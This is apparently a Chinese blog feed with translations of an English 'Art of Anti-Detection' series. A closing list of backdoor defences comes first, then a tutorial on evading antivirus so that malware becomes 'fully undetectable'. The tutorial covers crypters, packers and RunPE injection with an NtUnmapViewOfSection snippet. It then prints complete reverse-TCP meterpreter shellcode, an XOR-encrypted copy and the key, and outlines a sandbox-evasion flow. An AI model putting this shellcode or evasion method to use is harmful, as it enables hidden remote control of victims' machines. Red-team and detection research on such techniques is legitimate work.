<h3 id="2）异常section识别">2）异常section识别</h3><p>如果程序员不进行任何配置，编译器通常会创建5-6个通用类型的节，则所有安全产品都应具有识别不常见和可疑节的机制，如果节包含以下内容，则该机制可以查找节内的熵和数据对齐方式高熵和异常有序的数据，应该将其视为可疑的。</p>
<h3 id="3）签名检查">3）签名检查</h3><p>这种方法非常经典，但最有效，当下载新程序或任何可执行文件时，检查sha1签名是避免系统被植入后门文件的最安全方法。</p>
<h3 id="4）文件校验和检查">4）文件校验和检查</h3><p>如果可执行文件的校验和值与文件的实际校验和之间存在差异，则表明文件已被修改，安全产品和系统管理员应通过计算实际校验和并将其与文件的真实性进行比较来检查文件的真实性。</p>
<div align="center"><br><img src="/img/anti_av2_scan.png" align><br></div>

<h2 id="参考">参考</h2><p>[1] – <a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="external">https://github.com/secretsquirrel/the-backdoor-factory</a><br>[2] – <a href="https://www.shellterproject.com/" target="_blank" rel="external">https://www.shellterproject.com/</a><br>[3] – <a href="https://en.wikipedia.org/wiki/Red_team" target="_blank" rel="external">https://en.wikipedia.org/wiki/Red_team</a><br>[4] – <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a><br>[5] – <a href="https://en.wikipedia.org/wiki/Code_cave" target="_blank" rel="external">https://en.wikipedia.org/wiki/Code_cave</a><br>[6] – <a href="https://en.wikipedia.org/wiki/Checksum" target="_blank" rel="external">https://en.wikipedia.org/wiki/Checksum</a></p>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本文将会介绍用于安全测试红队目的几种制作PE（Portable Executable）文件后门的方法，如果需要完全理解本文，读者至少需要对x86汇编有一定的了解，同时需要熟悉调试器并且对PE文件格式有较高的理解。<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[反检测的艺术1-反病毒软件及检测技术概述（翻译）]]></title>
    <link href="http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/"/>
    <id>http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/</id>
    <published>2020-09-03T11:39:22.000Z</published>
    <updated>2021-03-16T15:18:52.607Z</updated>
    <content type="html"><![CDATA[<p>本篇文章将介绍对抗最新反病毒软件静态检测、动态检测及启发式分析最有效的方法。其中一些已经是公开并被大众所熟知的方法，但是仍然有一些方法和绕过技巧是实现完全不可被检测（FUD,Fully Undetectable）恶意代码的关键，同时恶意代码的大小与其反检测能力同等重要，因此在实现这些反检测方法的时候我会努力让恶意代码的文件大小尽可能的小。本文也将介绍反病毒软件及Windows操作系统的内部原理，因此读者最好具备一定的C/C++及汇编语言基础同时对PE文件结构有一定的了解<br><a id="more"></a></p>
<h2 id="0x00_介绍">0x00 介绍</h2><p>反检测方法应该针对不同种类的恶意代码有不同的方法，本文介绍的所有反检测方法可以适用于所有种类的恶意代码但是本文侧重于stager meterpreter类型载荷，因为meterpreter能够做所有其他恶意代码能够做的事情，通过meterpreter会话可以做很多事情，包括权限提升、窃取凭据、操作进程/注册表，在利用漏洞后能够进行更多操作，meterpreter也拥有非常活跃的社区，在安全研究人员中很受欢迎。</p>
<h2 id="0x01_相关术语">0x01 相关术语</h2><h3 id="基于特征码的检测技术">基于特征码的检测技术</h3><p>传统反病毒软件严重依赖基于特征码的检测技术检测恶意代码。一般，当恶意代码达到反病毒公司后，将交由恶意代码研究人员或者动态分析系统进行分析，一旦被确定为恶意代码，就会提取该恶意代码的特征码并将特征码添加到反病毒软件数据库中。</p>
<h3 id="静态分析">静态分析</h3><p>静态分析是在没有实际执行程序的情况下对程序进行分析的技术。在大多数情况下，是对软件源代码的某些版本进行分析，在某些情况下也会对目标源码的某些形式进行分析。</p>
<h3 id="动态分析">动态分析</h3><p>动态分析是在真实或者虚拟的计算机上执行程序进行分析。为了提高动态分析的有效性，必须对目标程序产生足够的输入让目标程序产生一些有趣的行为。</p>
<h3 id="沙盒">沙盒</h3><p>在计算机安全中沙盒是一种隔离运行中程序的一种安全机制。通常用于执行未经测试或者不受信任的风险程序和代码，可能来自未经验证或者不受信任的第三方供应商、网站或者用户，通过沙盒执行可以避免损害主机或者操作系统。</p>
<h3 id="启发式分析">启发式分析</h3><p>很多反病毒软件采用启发式分析检测目前未知病毒和已知病毒变种。启发式分析是一种基于专家的分析系统，使用各种规则和权重确定各种威胁和风险的安全性。多标准分析（MCA）是其中一种衡量手段，启发式分析不同于静态分析，静态分析依赖于自身的数据和统计信息。</p>
<h3 id="熵">熵</h3><p> 在计算机科学中，熵是操作系统或者应用程序收集的用于密码学或者其他需要随机数据用途的随机性的一种衡量方式。这种随机性一般来源于硬件，如鼠标移动或者专用的硬件随机数生成器的。熵过低可能会对计算机性能或者安全性造成伤害。</p>
<h2 id="0x02_常用反检测方法">0x02 常用反检测方法</h2><p>为了降低恶意代码被检测的风险，首先考虑使用的方式是加密程序、打包程序或者代码混淆。这些反检测技术和工具仍然可以绕过很多反病毒软件，但随着网络安全领域的进步，大多数的工具和方法已经过时并且无法生成完全不被检测的恶意代码。但是为了理解这些技术和工具的内部工作原理，这里还将对其进行简要描述。</p>
<h3 id="代码混淆">代码混淆</h3><p>代码混淆可以定义为在不破坏实际功能的情况下对二进制程序的源代码进行混淆的一种方法，这使静态分析更加困难，同时还改变二进制代码的哈希签名。混淆只需添加几行垃圾代码或更改指令的执行顺序即可实现。这种方法可以绕过数量可观的反病毒软件，但要取决于您混淆了多少。</p>
<h3 id="压缩壳工具">压缩壳工具</h3><p>压缩壳工具是压缩可执行文件并将压缩后的数据与解压缩代码合并为单个可执行文件的一种程序。当执行被压缩壳压缩的程序时，解压缩代码将在执行之前从压缩的代码重新创建原始代码。在大多数情况下，这对原始程序是透明的，因此可以与原始文件完全相同的方式使用压缩的可执行文件。当反病毒软件扫描被打包压缩的恶意代码时，它需要确定压缩算法并将其解压缩。由于压缩后的文件较难分析，因此恶意软件作者对压缩壳工具表现出了浓厚的兴趣。</p>
<h3 id="加密壳工具">加密壳工具</h3><p>加密壳工具是对给定二进制文件进行加密的程序，以使其难以分析或者进行逆向工程。被加密壳打包的程序优两部分组成：builder和stub，builder仅对给定的二进制文件进行加密并将其放置在stub中，stub是加密壳中最重要的部分，当我们执行被加密壳打包的二进制文件时，第一个stub运行并解密原始二进制文件到内存，然后通过RunPE方法在内存中执行二进制文件（在大多数情况下）。</p>
<div align="center"><br><img src="/img/anti_av_crypters.png" align><br></div>

<h2 id="0x03_加密壳压缩壳所面临的问题">0x03 加密壳压缩壳所面临的问题</h2><p>在介绍最有效反检测技术之前，已知的反检测技术其实所面临的问题其实很少。但是现在的反病毒公司已经意识到了这种危险，现在他们不仅扫描恶意代码的特征和有害行为，还在扫描加密壳和压缩壳的特征。与检测恶意代码相比，检测加密壳和压缩壳相对容易，因为它们都必须做某些可疑的事情，例如解密加密的PE文件并在内存中执行。</p>
<h3 id="PE注入">PE注入</h3><p>为了说明PE映像如何在内存中的执行，本文将会讲解Windows如何加载PE文件。在编译PE文件时，编译器会将主模块基地址设置为0x00400000，而编译过程中所有的地址指针和长跳转指令处的地址都是根据主模块地址计算的，在编译后期，编译器会在PE文件中创建一个重定位表，重定位表中包含的指令的地址取决于映像基址，例如地址指针和长跳转指令。<br>在执行PE映像时，操作系统会检查PE映像的默认基地址的可用性，如果默认基地址不可用，则操作系统会在启动过程系统加载程序需要之前，将PE映像加载到内存中的随机可用地址上。然后通过重定位表调整内存中的绝对地址，系统加载程序会修复所有与绝对地址相关的指令，然后启动这个被挂起的进程。这种机制称为地址随机化ASLR。<br>为了在内存上执行PE映像，加密壳需要解析PE头并重新定位绝对地址，同时必须模拟系统加载器，这种行为是非常可疑的。几乎每次当我们分析用C或其他高级语言编写的加密壳的时候，我们都会发现使用了NtUnmapViewOfSection或者ZwUnmapViewOfSection这两个Windows系统API，这两个函数的作用为从虚拟内存中卸载某些sections的映射，它们在RunPE类内存执行技术中起着非常大的作用，几乎%90的加密壳都会使用这种技术。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xNtUnmapViewOfSection = NtUnmapViewOfSection<span class="list">(<span class="keyword">GetProcAddress</span><span class="list">(<span class="keyword">GetModuleHandleA</span><span class="list">(<span class="string">"ntdll.dll"</span>)</span>, <span class="string">"NtUnmapViewOfSection"</span>)</span>)</span><span class="comment">;</span></span><br><span class="line">xNtUnmapViewOfSection<span class="list">(<span class="keyword">PI</span>.hProcess, PVOID<span class="list">(<span class="keyword">dwImageBase</span>)</span>)</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>当然，反病毒软件不能仅仅对使用这些Windows API函数的程序都判定为恶意代码，但使用这些函数的顺序非常重要。一小部分的加密壳（通常是用汇编语言编写）不使用这些函数并手动执行重定位，之前这种方式非常有效，但后续这种方法也将可能会失效，因为从逻辑上讲，正常程序都不会模拟系统加载器。另一个缺点是输入文件的熵极大增加，因为对整个PE文件进行了加密，熵将不可避免地上升，当反病毒软件检测到PE文件异常熵时，它们可能会将文件标记为可疑文件。</p>
<div align="center"><br><img src="/img/anti_av_suspicious.png" align><br></div>

<h3 id="完美的方法">完美的方法</h3><p>通过加密恶意代码实现反检测的概念很聪明，但是执行解密功能的函数应该适当地的做混淆处理，同时内存中执行解密代码的时候，我们必须在不执行重定位的情况下进行加密，而且还必须有一种检测执行环境的功能的检测机制恶意代码是否在沙盒中执行，如果检测机制检测到反病毒软件正在分析恶意软件，则不应执行解密功能。与其加密整个PE文件不如只加密shellcode或仅二进制文件的.text节，这样可以使熵值较低，也不用修改PE头部和其他节。<br>下面是恶意代码的执行流程图。</p>
<div align="center"><br><img src="/img/anti_av_malware_flow.png" align><br></div><br>在环境检测函数中将会检查当前恶意代码是否在沙盒中被动态分析，如果检测到正在沙盒中被动态分析则继续执行main函数或者直接崩溃，如果未检测到沙盒环境则执行解密shellcode函数。<br>原始reverse tcp meterpreter的shellcode如下：<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Shellcode[] = &#123;</span><br><span class="line">  <span class="number">0xfc</span>, <span class="number">0xe8</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x64</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0x30</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x0c</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x14</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x28</span>,</span><br><span class="line">  <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>,</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0xe2</span>, <span class="number">0xf2</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>,</span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x8b</span>, <span class="number">0x4a</span>, <span class="number">0x3c</span>, <span class="number">0x8b</span>, <span class="number">0x4c</span>, <span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0xe3</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd1</span>,</span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x59</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x49</span>, <span class="number">0x18</span>, <span class="number">0xe3</span>, <span class="number">0x3a</span>, <span class="number">0x49</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xac</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf6</span>, <span class="number">0x03</span>, <span class="number">0x7d</span>, <span class="number">0xf8</span>, <span class="number">0x3b</span>, <span class="number">0x7d</span>, <span class="number">0x24</span>, <span class="number">0x75</span>,</span><br><span class="line">  <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>, <span class="number">0x4b</span>, <span class="number">0x8b</span>,</span><br><span class="line">  <span class="number">0x58</span>, <span class="number">0x1c</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>, <span class="number">0x61</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xeb</span>, <span class="number">0x8d</span>, <span class="number">0x5d</span>, <span class="number">0x68</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x77</span>,</span><br><span class="line">  <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x5f</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xb8</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x29</span>, <span class="number">0xc4</span>, <span class="number">0x54</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x6b</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x6a</span>, <span class="number">0x05</span>, <span class="number">0x68</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x68</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x5c</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x40</span>,</span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0xea</span>, <span class="number">0x0f</span>, <span class="number">0xdf</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x97</span>, <span class="number">0x6a</span>, <span class="number">0x10</span>, <span class="number">0x56</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x99</span>, <span class="number">0xa5</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x0c</span>,</span><br><span class="line">  <span class="number">0xff</span>, <span class="number">0x4e</span>, <span class="number">0x08</span>, <span class="number">0x75</span>, <span class="number">0xec</span>, <span class="number">0x68</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,</span><br><span class="line">  <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x04</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>,</span><br><span class="line">  <span class="number">0xd5</span>, <span class="number">0x8b</span>, <span class="number">0x36</span>, <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x6a</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x58</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x93</span>, <span class="number">0x53</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>,</span><br><span class="line">  <span class="number">0x29</span>, <span class="number">0xc6</span>, <span class="number">0x75</span>, <span class="number">0xee</span>, <span class="number">0xc3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">为了使熵值和文件大小保持在适当的值，我们将会使用简单的XOR加密算法加密这段shellcode，虽然XOR不是一个像RC4、blowfis的标准的加密算法，但是我们不需要一个强加密算法，因为反病毒软件不会去解密shellcode，仅仅是让这段shellcode对静态字符串分析不可读和不可检测就够了，同时使用XOR会使得解密更快并且避免使用加密库会使文件大小更小。</span><br><span class="line">经过XOR加密后的代码如下：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Shellcode[] = &#123;</span><br><span class="line">  <span class="number">0xfb</span>, <span class="number">0xcd</span>, <span class="number">0x8d</span>, <span class="number">0x9e</span>, <span class="number">0xba</span>, <span class="number">0x42</span>, <span class="number">0xe1</span>, <span class="number">0x93</span>, <span class="number">0xe2</span>, <span class="number">0x14</span>, <span class="number">0xcf</span>, <span class="number">0xfa</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x12</span>, <span class="number">0xb1</span>, <span class="number">0x91</span>, <span class="number">0x55</span>, <span class="number">0x29</span>, <span class="number">0x84</span>, <span class="number">0xcc</span>, <span class="number">0xae</span>, <span class="number">0xc9</span>, <span class="number">0xf3</span>, <span class="number">0x32</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x92</span>, <span class="number">0x45</span>, <span class="number">0xb8</span>, <span class="number">0x8b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x26</span>, <span class="number">0x66</span>, <span class="number">0x59</span>, <span class="number">0x0d</span>, <span class="number">0xb2</span>,</span><br><span class="line">  <span class="number">0x9a</span>, <span class="number">0x83</span>, <span class="number">0x4e</span>, <span class="number">0x17</span>, <span class="number">0x06</span>, <span class="number">0xe2</span>, <span class="number">0xed</span>, <span class="number">0x6c</span>, <span class="number">0xe8</span>, <span class="number">0x15</span>, <span class="number">0x0a</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0xae</span>, <span class="number">0x45</span>, <span class="number">0xa2</span>, <span class="number">0x31</span>, <span class="number">0x0e</span>, <span class="number">0x90</span>, <span class="number">0x62</span>, <span class="number">0xe4</span>, <span class="number">0x6d</span>, <span class="number">0x0e</span>, <span class="number">0x4f</span>,</span><br><span class="line">  <span class="number">0xeb</span>, <span class="number">0xc9</span>, <span class="number">0xd8</span>, <span class="number">0x3a</span>, <span class="number">0x06</span>, <span class="number">0xf6</span>, <span class="number">0x84</span>, <span class="number">0xd7</span>, <span class="number">0xa2</span>, <span class="number">0xa1</span>, <span class="number">0xbb</span>, <span class="number">0x53</span>,</span><br><span class="line">  <span class="number">0x8c</span>, <span class="number">0x11</span>, <span class="number">0x84</span>, <span class="number">0x9f</span>, <span class="number">0x6c</span>, <span class="number">0x73</span>, <span class="number">0x7e</span>, <span class="number">0xb6</span>, <span class="number">0xc6</span>, <span class="number">0xea</span>, <span class="number">0x02</span>, <span class="number">0x9f</span>,</span><br><span class="line">  <span class="number">0x7d</span>, <span class="number">0x7a</span>, <span class="number">0x61</span>, <span class="number">0x6f</span>, <span class="number">0xf1</span>, <span class="number">0x26</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x81</span>, <span class="number">0x3f</span>, <span class="number">0xa5</span>, <span class="number">0x6f</span>,</span><br><span class="line">  <span class="number">0xe3</span>, <span class="number">0x7d</span>, <span class="number">0x84</span>, <span class="number">0xc6</span>, <span class="number">0x9e</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x7c</span>, <span class="number">0x8c</span>, <span class="number">0x29</span>, <span class="number">0x44</span>, <span class="number">0x15</span>,</span><br><span class="line">  <span class="number">0xe2</span>, <span class="number">0x5e</span>, <span class="number">0x80</span>, <span class="number">0xc9</span>, <span class="number">0x8c</span>, <span class="number">0x21</span>, <span class="number">0x84</span>, <span class="number">0x9f</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xc5</span>, <span class="number">0x3e</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x7e</span>, <span class="number">0x54</span>, <span class="number">0xff</span>, <span class="number">0xe3</span>, <span class="number">0x18</span>, <span class="number">0xd0</span>, <span class="number">0xe5</span>, <span class="number">0xe7</span>, <span class="number">0x7a</span>, <span class="number">0x50</span>, <span class="number">0xc4</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x50</span>, <span class="number">0x6a</span>, <span class="number">0x97</span>, <span class="number">0x5a</span>, <span class="number">0x4d</span>, <span class="number">0x3c</span>, <span class="number">0xac</span>, <span class="number">0xba</span>, <span class="number">0x42</span>, <span class="number">0xe9</span>, <span class="number">0x6d</span>,</span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0x17</span>, <span class="number">0x50</span>, <span class="number">0xca</span>, <span class="number">0xd2</span>, <span class="number">0x0e</span>, <span class="number">0xf6</span>, <span class="number">0x3c</span>, <span class="number">0x00</span>, <span class="number">0xda</span>, <span class="number">0xda</span>, <span class="number">0x26</span>,</span><br><span class="line">  <span class="number">0x2a</span>, <span class="number">0x43</span>, <span class="number">0x81</span>, <span class="number">0x1a</span>, <span class="number">0x2e</span>, <span class="number">0xe1</span>, <span class="number">0x5b</span>, <span class="number">0xce</span>, <span class="number">0xd2</span>, <span class="number">0x6b</span>, <span class="number">0x01</span>, <span class="number">0x71</span>,</span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0xda</span>, <span class="number">0xda</span>, <span class="number">0xf4</span>, <span class="number">0xbf</span>, <span class="number">0x2a</span>, <span class="number">0xfe</span>, <span class="number">0x1a</span>, <span class="number">0x07</span>, <span class="number">0x24</span>, <span class="number">0x67</span>, <span class="number">0x9c</span>,</span><br><span class="line">  <span class="number">0xba</span>, <span class="number">0x53</span>, <span class="number">0xdd</span>, <span class="number">0x93</span>, <span class="number">0xe1</span>, <span class="number">0x75</span>, <span class="number">0x5f</span>, <span class="number">0xce</span>, <span class="number">0xea</span>, <span class="number">0x02</span>, <span class="number">0xd1</span>, <span class="number">0x5a</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x4d</span>, <span class="number">0xe5</span>, <span class="number">0x91</span>, <span class="number">0x65</span>, <span class="number">0xa2</span>, <span class="number">0x7e</span>, <span class="number">0xcf</span>, <span class="number">0x90</span>, <span class="number">0x4f</span>, <span class="number">0x1f</span>, <span class="number">0xc8</span>,</span><br><span class="line">  <span class="number">0xed</span>, <span class="number">0x2a</span>, <span class="number">0x18</span>, <span class="number">0xbf</span>, <span class="number">0x73</span>, <span class="number">0x44</span>, <span class="number">0xf0</span>, <span class="number">0x4b</span>, <span class="number">0x3f</span>, <span class="number">0x82</span>, <span class="number">0xf5</span>, <span class="number">0x16</span>,</span><br><span class="line">  <span class="number">0xf8</span>, <span class="number">0x6b</span>, <span class="number">0x07</span>, <span class="number">0xeb</span>, <span class="number">0x56</span>, <span class="number">0x2a</span>, <span class="number">0x71</span>, <span class="number">0xaf</span>, <span class="number">0xa5</span>, <span class="number">0x73</span>, <span class="number">0xf0</span>, <span class="number">0x4b</span>,</span><br><span class="line">  <span class="number">0xd0</span>, <span class="number">0x42</span>, <span class="number">0xeb</span>, <span class="number">0x1e</span>, <span class="number">0x51</span>, <span class="number">0x72</span>, <span class="number">0x67</span>, <span class="number">0x9c</span>, <span class="number">0x63</span>, <span class="number">0x8a</span>, <span class="number">0xde</span>, <span class="number">0xe5</span>,</span><br><span class="line">  <span class="number">0xd2</span>, <span class="number">0xae</span>, <span class="number">0x39</span>, <span class="number">0xf4</span>, <span class="number">0xfa</span>, <span class="number">0x2a</span>, <span class="number">0x81</span>, <span class="number">0x0a</span>, <span class="number">0x07</span>, <span class="number">0x25</span>, <span class="number">0x59</span>, <span class="number">0xf4</span>,</span><br><span class="line">  <span class="number">0xba</span>, <span class="number">0x2a</span>, <span class="number">0xd9</span>, <span class="number">0xbe</span>, <span class="number">0x54</span>, <span class="number">0xc0</span>, <span class="number">0xf0</span>, <span class="number">0x4b</span>, <span class="number">0x29</span>, <span class="number">0x11</span>, <span class="number">0xeb</span>, <span class="number">0x1a</span>,</span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x76</span>, <span class="number">0x58</span>, <span class="number">0xf6</span>, <span class="number">0xb8</span>, <span class="number">0x9b</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0xf8</span>, <span class="number">0xf0</span>, <span class="number">0x0e</span>, <span class="number">0x5d</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0x84</span>, <span class="number">0xf4</span>, <span class="number">0xf4</span>, <span class="number">0xc4</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Key[] = &#123;</span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x25</span>, <span class="number">0x0f</span>, <span class="number">0x9e</span>, <span class="number">0xba</span>, <span class="number">0x42</span>, <span class="number">0x81</span>, <span class="number">0x1a</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br><br>由于我们编写了一个新的恶意代码，因反病毒防病毒软件不知道我们的恶意代码的哈希签名，因此我们不必担心基于特征码的检测，我们将对shellcode进行加密并混淆我们的反检测、反逆向工程、解密功能的代码，这样就足够绕过基于静态和启发式扫描，最后就只需要绕过反病毒软件的动态扫描就可以了，绕过动态扫描最重要的方法是通过AV detect实现，但是在开始写AV detect功能之前我们将介绍反病毒软件的启发式分析引擎是如何工作的。<br><br>## 